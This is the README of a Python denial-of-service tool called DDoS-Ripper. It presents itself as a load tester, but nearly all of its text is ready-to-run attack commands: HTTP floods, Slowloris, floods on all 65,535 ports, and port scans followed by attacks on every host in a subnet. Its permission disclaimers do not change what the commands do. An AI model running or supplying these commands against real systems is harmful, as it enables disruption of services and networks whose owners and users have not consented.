# DDoS-Ripper CLI Tool

A high-performance command-line tool for load testing and stress testing web applications. Sends massive amounts of HTTP traffic to target servers using multiple attack modes and techniques.

## ⚠️ Important Legal and Ethical Notice

**This tool is intended for legitimate purposes only:**
- Testing your own applications and services
- Load testing with explicit permission from the target owner
- Performance evaluation in controlled environments

**DO NOT use this tool to:**
- Attack websites or services without authorization
- Perform DDoS attacks on systems you don't own
- Disrupt services you don't own or have permission to test

Unauthorized use of this tool may be illegal and could result in criminal prosecution. Use responsibly and ethically.

## Features

- 🚀 **High-Performance**: Socket-level HTTP requests for maximum throughput
- 🔥 **Multiple Attack Modes**: Flood and Slowloris attacks
- 🔍 **Port Scanning**: Scan and detect open ports on target IP
- 🎯 **Multi-Port Attacks**: Attack multiple ports simultaneously
- 🌐 **Network Attacks**: Attack all IPs in subnet and all their ports
- 🎲 **Randomization**: User-agent rotation and random query parameters
- 📊 **Real-Time Statistics**: Live updates during attack execution
- 🔧 **Flexible Configuration**: Support for HTTP/HTTPS, custom ports, and headers
- 💻 **Cross-Platform**: Works on Windows, Linux, and macOS
- 📦 **No Dependencies**: Uses only Python standard library

## Installation

### Prerequisites

- Python 3.7 or higher (no additional dependencies required!)

### Quick Install

1. **Clone or download this repository**
   ```bash
   git clone https://github.com/yourusername/ddos-ripper.git
   cd ddos-ripper
   ```

2. **Verify Python installation**
   ```bash
   python3 --version
   # or
   python --version
   ```

3. **That's it!** The tool uses only Python standard library - no installation needed.

## Quick Start

### Basic Usage

```bash
# Basic flood attack
python3 DRipper.py -s 192.168.1.1 -t 135

# Attack with URL
python3 DRipper.py -s https://example.com -t 200

# Attack with hostname and port
python3 DRipper.py -s example.com:8080 -t 500
```

### Command Syntax

```bash
python3 DRipper.py -s <TARGET> -t <THREADS> [OPTIONS]
```

## Command-Line Options

### Required Arguments

| Option | Short | Description | Example |
|--------|-------|-------------|---------|
| `--server` | `-s` | Target server (IP, hostname, or URL) | `-s 192.168.1.1` |

### Optional Arguments

| Option | Description | Default | Example |
|--------|-------------|---------|---------|
| `--threads` | `-t` | Number of concurrent threads per port | `135` | `-t 500` |
| `--mode` | Attack mode (flood/slowloris) | `flood` | `--mode slowloris` |
| `--scan` | Scan all ports (1-65535) and attack detected ports | - | `--scan` |
| `--scan-common` | Scan common ports only and attack detected ports | - | `--scan-common` |
| `--scan-range` | Scan specific port range | - | `--scan-range 1 1000` |
| `--ports` | Attack specific ports (comma-separated) | - | `--ports 80,443,8080` |
| `--attack-all` | Attack all detected ports without prompting | - | `--attack-all` |
| `--attack-all-ports` | Attack ALL ports (1-65535) simultaneously | - | `--attack-all-ports` |
| `--attack-port-range` | Attack all ports in a range | - | `--attack-port-range 1 1000` |
| `--attack-network` | Attack all IPs in subnet and all their ports | - | `--attack-network` |
| `--subnet-mask` | Subnet mask for network scanning (default: 24) | `24` | `--subnet-mask 16` |
| `--scan-timeout` | Port scan timeout in seconds | `3.0` | `--scan-timeout 5.0` |
| `--scan-retries` | Number of retries per port | `2` | `--scan-retries 3` |
| `--force-common-ports` | Force attack on common ports if scan fails | - | `--force-common-ports` |
| `--help` | `-h` | Show help message | - | `-h` |

## Usage Examples

### Basic Examples

#### 1. Simple Flood Attack
```bash
# Attack a local server with default settings
python3 DRipper.py -s 192.168.1.1 -t 135
```

#### 2. High-Intensity Attack
```bash
# Attack with 1000 concurrent threads
python3 DRipper.py -s https://example.com -t 1000
```

#### 3. Attack with Custom Port
```bash
# Attack a server on port 8080
python3 DRipper.py -s 192.168.1.1:8080 -t 200
```

#### 4. Slowloris Attack
```bash
# Slowloris attack (keeps connections open)
python3 DRipper.py -s example.com -t 500 --mode slowloris
```

#### 5. Attack with Full URL
```bash
# Attack a specific endpoint
python3 DRipper.py -s https://api.example.com/v1/users -t 300
```

### Advanced Examples

#### 6. Testing Local Development Server
```bash
# Test your local web app
python3 DRipper.py -s http://localhost:3000 -t 100
```

#### 7. Testing API Endpoint
```bash
# Load test an API endpoint
python3 DRipper.py -s https://api.example.com/endpoint -t 250
```

#### 8. High-Volume Test
```bash
# Maximum intensity test
python3 DRipper.py -s https://example.com -t 2000
```

### Port Scanning Examples

#### 9. Scan All Ports and Attack Detected Ports
```bash
# Scan all ports (1-65535) and interactively select ports to attack
python3 DRipper.py -s 192.168.1.1 --scan -t 200
```

#### 10. Scan Common Ports Only
```bash
# Scan common ports (21, 22, 80, 443, etc.) and attack detected ports
python3 DRipper.py -s 192.168.1.1 --scan-common -t 200
```

#### 11. Scan Specific Port Range
```bash
# Scan ports 1-1000 and attack detected ports
python3 DRipper.py -s 192.168.1.1 --scan-range 1 1000 -t 200
```

#### 12. Attack All Detected Ports Automatically
```bash
# Scan and attack all detected ports without prompting
python3 DRipper.py -s 192.168.1.1 --scan-common --attack-all -t 200
```

#### 13. Attack Specific Ports
```bash
# Attack specific ports directly (no scanning)
python3 DRipper.py -s 192.168.1.1 -t 200 --ports 80,443,8080
```

#### 14. Multi-Port Attack with Slowloris
```bash
# Scan common ports and attack with slowloris mode
python3 DRipper.py -s 192.168.1.1 --scan-common --attack-all -t 300 --mode slowloris
```

#### 15. Attack ALL Ports (1-65535)
```bash
# Attack ALL 65,535 ports simultaneously (EXTREME - use with caution!)
python3 DRipper.py -s 192.168.1.1 -t 10 --attack-all-ports

# With more threads per port (WARNING: Very resource-intensive!)
python3 DRipper.py -s 192.168.1.1 -t 50 --attack-all-ports
```

#### 16. Attack Port Range
```bash
# Attack all ports from 1 to 1000
python3 DRipper.py -s 192.168.1.1 -t 100 --attack-port-range 1 1000

# Attack ports 8000-9000
python3 DRipper.py -s 192.168.1.1 -t 200 --attack-port-range 8000 9000
```

### Network Attack Examples

#### 15. Attack All IPs in Subnet and All Their Ports
```bash
# Attack all IPs in the same subnet (/24) and all detected ports
python3 DRipper.py -s 192.168.1.1 -t 200 --attack-network
```

#### 16. Network Attack with Custom Subnet Mask
```bash
# Attack all IPs in /16 subnet (larger network)
python3 DRipper.py -s 192.168.1.1 -t 200 --attack-network --subnet-mask 16
```

#### 17. Network Attack with Slowloris
```bash
# Network attack using slowloris mode
python3 DRipper.py -s 192.168.1.1 -t 300 --attack-network --mode slowloris
```

## Port Scanning

The tool includes built-in port scanning capabilities to detect open ports on target IPs.

### Scanning Options

#### 1. Full Port Scan (`--scan`)
- Scans all ports from 1 to 65535
- Uses multi-threaded scanning for speed
- Shows progress during scan
- Interactive port selection after scan

**Example:**
```bash
python3 DRipper.py -s 192.168.1.1 --scan -t 200
```

#### 2. Common Ports Scan (`--scan-common`)
- Scans only common ports (21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 8888, 9000, 9090)
- Much faster than full scan
- Good for quick reconnaissance

**Example:**
```bash
python3 DRipper.py -s 192.168.1.1 --scan-common -t 200
```

#### 3. Custom Range Scan (`--scan-range`)
- Scan a specific port range
- Useful for targeted scanning

**Example:**
```bash
python3 DRipper.py -s 192.168.1.1 --scan-range 1 1000 -t 200
```

### Port Selection

After scanning, you can:
- **Select specific ports**: Enter port numbers separated by commas (e.g., `80,443,8080`)
- **Attack all ports**: Enter `all` to attack all detected ports
- **Quit**: Enter `q` to exit

### Automatic Attack (`--attack-all`)

Use `--attack-all` with scanning options to automatically attack all detected ports without prompting:

```bash
python3 DRipper.py -s 192.168.1.1 --scan-common --attack-all -t 200
```

### Direct Port Attack (`--ports`)

Attack specific ports directly without scanning:

```bash
python3 DRipper.py -s 192.168.1.1 -t 200 --ports 80,443,8080
```

### Attack ALL Ports (`--attack-all-ports`)

Attack ALL 65,535 ports simultaneously without scanning:

**⚠️ WARNING: This is extremely resource-intensive!**
- Creates attacks on every single port (1-65535)
- Uses optimized worker pool for large port ranges
- May overwhelm your system and network
- Recommended to use low thread count (10-50)

**Example:**
```bash
# Attack all ports with low thread count
python3 DRipper.py -s 192.168.1.1 -t 10 --attack-all-ports

# With more threads (WARNING: Very intensive!)
python3 DRipper.py -s 192.168.1.1 -t 50 --attack-all-ports
```

### Attack Port Range (`--attack-port-range`)

Attack all ports in a specific range:

**Example:**
```bash
# Attack ports 1-1000
python3 DRipper.py -s 192.168.1.1 -t 100 --attack-port-range 1 1000

# Attack ports 8000-9000
python3 DRipper.py -s 192.168.1.1 -t 200 --attack-port-range 8000 9000
```

### Network Attack (`--attack-network`)

Attack all IPs in the same subnet and all their detected ports:

**How it works:**
1. Finds all IPs in the same subnet as the target IP (default: /24 subnet)
2. Scans common ports on all those IPs
3. Attacks all detected ports on all detected IPs simultaneously

**Example:**
```bash
# Attack all IPs in /24 subnet (e.g., 192.168.1.0/24)
python3 DRipper.py -s 192.168.1.1 -t 200 --attack-network

# Attack with custom subnet mask (e.g., /16 for larger network)
python3 DRipper.py -s 192.168.1.1 -t 200 --attack-network --subnet-mask 16
```

**Features:**
- Automatically discovers all IPs in the subnet
- Scans common ports on all IPs
- Attacks all detected ports on all detected IPs
- Warning prompt if more than 50 IPs found
- Configurable subnet mask (default: /24)

**Note:** This feature requires an IP address, not a hostname or URL.

## Attack Modes

### Flood Mode (Default)
- **Description**: Sends HTTP requests as fast as possible
- **Use Case**: General load testing, stress testing
- **Characteristics**:
  - Maximum throughput
  - Random user agents
  - Random query parameters
  - Fast connection establishment

**Example:**
```bash
python3 DRipper.py -s example.com -t 500 --mode flood
```

### Slowloris Mode
- **Description**: Keeps connections open for extended periods
- **Use Case**: Testing connection pool limits, server resilience
- **Characteristics**:
  - Slow connection establishment
  - Keeps connections alive
  - Targets connection pool exhaustion
  - Lower resource usage

**Example:**
```bash
python3 DRipper.py -s example.com -t 500 --mode slowloris
```

## Custom Headers

You can customize HTTP headers by creating a `headers.txt` file in the same directory as `DRipper.py`.

### Format

Create `headers.txt` with one header per line:
```
User-Agent: Custom-Agent/1.0
Accept: application/json
Authorization: Bearer your-token-here
Content-Type: application/json
```

### Example

1. Create `headers.txt`:
   ```
   User-Agent: MyTestBot/1.0
   Accept: text/html,application/json
   X-Custom-Header: test-value
   ```

2. Run the attack:
   ```bash
   python3 DRipper.py -s example.com -t 200
   ```

The tool will automatically load and use these headers.

## Output and Statistics

During execution, you'll see real-time statistics:

```
[ATTACK] Total: 15234 | Success: 14890 | Failed: 344 | RPS: 1250.5
```

After the attack stops (Ctrl+C), you'll see final statistics:

```
======================================================================
📊 ATTACK STATISTICS
======================================================================
Total Requests:  15,234
Successful:      14,890 (97.7%)
Failed:          344 (2.3%)

Status Codes:
  200: 14890
  404: 200
  500: 144

Errors:
  timeout: 200
  connection_refused: 144
======================================================================
```

### Statistics Explained

- **Total Requests**: Total number of HTTP requests sent
- **Successful**: Requests that received a response (2xx, 3xx status codes)
- **Failed**: Requests that failed or received error responses
- **RPS**: Requests per second (throughput metric)
- **Status Codes**: Distribution of HTTP response codes
- **Errors**: Breakdown of error types encountered

## Platform-Specific Instructions

### Windows

```bash
# Using Python 3
python DRipper.py -s 192.168.1.1 -t 135

# Or using Python 3 explicitly
py -3 DRipper.py -s 192.168.1.1 -t 135
```

### Linux / macOS

```bash
# Using Python 3
python3 DRipper.py -s 192.168.1.1 -t 135

# Or if python3 is aliased to python
python DRipper.py -s 192.168.1.1 -t 135
```

### Termux (Android)

```bash
# Install Python if needed
pkg install python

# Run the tool
python3 DRipper.py -s 192.168.1.1 -t 135
```

## Performance Tips

1. **Start Small**: Begin with lower thread counts (50-200) and gradually increase
2. **Monitor Resources**: Watch CPU, memory, and network usage
3. **Network Bandwidth**: Consider your network capacity limitations
4. **Target Server**: Be aware of the target server's capacity and rate limits
5. **Thread Count**: 
   - Low (50-200): Light testing
   - Medium (200-500): Moderate load
   - High (500-1000): Heavy load
   - Very High (1000+): Maximum intensity
6. **Stop Attack**: Press `Ctrl+C` to stop the attack gracefully

## Troubleshooting

### Common Issues

#### Issue: "No module named 'socket'"
**Solution**: You're using Python 2. Use Python 3:
```bash
python3 DRipper.py -s example.com -t 135
```

#### Issue: "Connection refused"
**Solution**: 
- Check if the target server is running
- Verify the IP address or URL is correct
- Check if the port is correct
- Ensure firewall allows connections

#### Issue: "SSL certificate verification failed"
**Solution**: The tool automatically handles SSL certificate verification. If issues persist, check:
- Target server's SSL certificate is valid
- Network connectivity to the target

#### Issue: Low RPS (Requests Per Second)
**Solution**:
- Increase thread count: `-t 500` or higher
- Check your network bandwidth
- Verify target server can handle the load
- Check for rate limiting on target server

#### Issue: High failure rate
**Solution**:
- Reduce thread count
- Check target server status
- Verify network connectivity
- Check for rate limiting or DDoS protection

### Getting Help

1. **Check the help message:**
   ```bash
   python3 DRipper.py --help
   ```

2. **Verify your command syntax:**
   ```bash
   python3 DRipper.py -s <target> -t <threads>
   ```

3. **Test with a simple target first:**
   ```bash
   python3 DRipper.py -s http://localhost:3000 -t 10
   ```

## Best Practices

1. **Test Your Own Servers**: Only test servers you own or have explicit permission to test
2. **Start Gradually**: Begin with low thread counts and increase gradually
3. **Monitor Both Sides**: Monitor both your machine and the target server
4. **Set Limits**: Use reasonable thread counts to avoid overwhelming systems
5. **Document Results**: Keep track of test results for analysis
6. **Respect Rate Limits**: Be aware of rate limiting on target servers

## Limitations

- **Single Machine**: Runs on one machine - for distributed testing, use multiple instances
- **Network Bandwidth**: Your network capacity limits maximum throughput
- **System Resources**: CPU and memory affect performance
- **Target Server**: Server capacity and rate limiting affect results
- **Execution Time**: Attacks run until manually stopped (Ctrl+C)

## Technical Details

- **Language**: Python 3.7+
- **Dependencies**: None (uses only Python standard library)
- **Implementation**: Thread-based, socket-level HTTP requests
- **Protocols**: HTTP and HTTPS (with SSL/TLS support)
- **Threading**: Multi-threaded for concurrent requests
- **Statistics**: Thread-safe real-time statistics collection

## File Structure

```
.
├── DRipper.py          # Main CLI tool
├── headers.txt         # Custom headers file (optional)
├── README.md          # This file
└── requirements.txt   # No dependencies (empty file)
```

## Examples Summary

```bash
# Basic attack
python3 DRipper.py -s 192.168.1.1 -t 135

# High-intensity attack
python3 DRipper.py -s https://example.com -t 1000

# Slowloris attack
python3 DRipper.py -s example.com -t 500 --mode slowloris

# Custom port
python3 DRipper.py -s 192.168.1.1:8080 -t 200

# Local testing
python3 DRipper.py -s http://localhost:3000 -t 100

# Port scanning and attack
python3 DRipper.py -s 192.168.1.1 --scan-common -t 200

# Attack all detected ports
python3 DRipper.py -s 192.168.1.1 --scan-common --attack-all -t 200

# Attack specific ports
python3 DRipper.py -s 192.168.1.1 -t 200 --ports 80,443,8080

# Attack ALL ports (1-65535) - EXTREME!
python3 DRipper.py -s 192.168.1.1 -t 10 --attack-all-ports

# Attack port range
python3 DRipper.py -s 192.168.1.1 -t 100 --attack-port-range 1 1000

# Attack all IPs in subnet and all their ports
python3 DRipper.py -s 192.168.1.1 -t 200 --attack-network
```

## License

This tool is provided as-is for educational and legitimate testing purposes. Use at your own risk and only on systems you own or have explicit permission to test.

## Support

For issues, questions, or contributions:
- Check the troubleshooting section above
- Review the help message: `python3 DRipper.py --help`
- Ensure you're using Python 3.7 or higher

---

**Remember**: Only use this tool on systems you own or have explicit permission to test. Unauthorized use is illegal and unethical.
